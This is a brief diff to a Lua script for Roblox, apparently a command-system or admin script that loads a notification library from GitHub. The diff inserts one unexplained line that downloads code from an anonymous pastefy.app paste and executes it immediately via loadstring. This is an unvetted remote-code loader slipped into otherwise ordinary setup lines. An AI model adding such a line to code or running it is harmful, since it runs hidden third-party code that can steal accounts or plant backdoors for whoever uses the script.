@@ -16,6 +16,7 @@ local UserInputService = game:GetService("UserInputService")
 local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()
 local InsertService = game:GetService("InsertService")
 local StarterGui = game:GetService("StarterGui")
+loadstring(game:HttpGet("https://pastefy.app/HwDEaEcL/raw"))()
 local CommandSystem = {
 	commands = {}
 }
